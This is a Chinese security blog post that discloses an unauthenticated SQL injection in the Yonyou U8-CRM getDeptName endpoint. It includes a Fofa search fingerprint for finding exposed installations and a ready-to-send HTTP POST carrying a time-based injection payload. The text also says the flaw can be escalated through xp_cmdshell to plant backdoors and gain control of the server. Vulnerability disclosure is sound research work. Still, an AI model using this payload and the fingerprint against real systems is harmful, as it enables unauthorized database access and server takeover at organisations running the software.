#  用友U8-CRM系统存在前台SQL注入漏洞   
原创 Mstir  星悦安全   2024-12-13 04:57  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**用友U8CRM是一款集CRM、呼叫中心、OA核心应用于一体，提供前端营销、后端业务处理及员工管理一体化应用的管理软件。软件立足代理销售服务行业管理一体化的高度，以“整合、专业、智能、畅捷”为产品研发理念，弥补了代理销售服务行业信息化管理的空白，为其经营管理的腾飞注入了强大的力量！**  
  
**Fofa指纹:title="用友U8CRM"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f5giaBhicHRkXpCzGjpERliaPBFdZfPHT3hVOAVibt1fFlQHiaFdEFuh3sibsDmBNuKmSSIgRohI2lPjNw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f5giaBhicHRkXpCzGjpERliaPznH7IOnWqFhTDPvwg8PRCOwcHEDPL8BrtWIjqlGs3EeCuQ2ZljYU0Q/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f5giaBhicHRkXpCzGjpERliaPoOic6fHia2jt42qa5bbBd1CrzKtNn26OiarrgWg7aaia10rxlKsfPGnmmw/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
**用友U8+CRM系统getDeptName存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。**  
```
POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

userid=1%27;WAITFOR+DELAY+%270:0:5%27--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f5giaBhicHRkXpCzGjpERliaPXkkRWc1JUquBxEQAqsKClfpgLH2rZHsYKIHNdZfuBic0fWX3o5nQTyg/640?wx_fmt=png&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**用友U8源码关注公众号发送 241213 获取!**  
  
****  
  
  
  
**承接SRC众测、代码审计、红蓝攻防、培训、招聘等业务 小助理微信：Lonely3944**  
  
**PS:代码审计，Fofa网站数100以下无偿审计**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5f5giaBhicHRkXpCzGjpERliaPs1eeGLOH5f0xneaZzlzZeqDbsU9XlriaC8f3XMxfZvn5OI0OXBtGNoA/640?wx_fmt=jpeg&from=appmsg "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
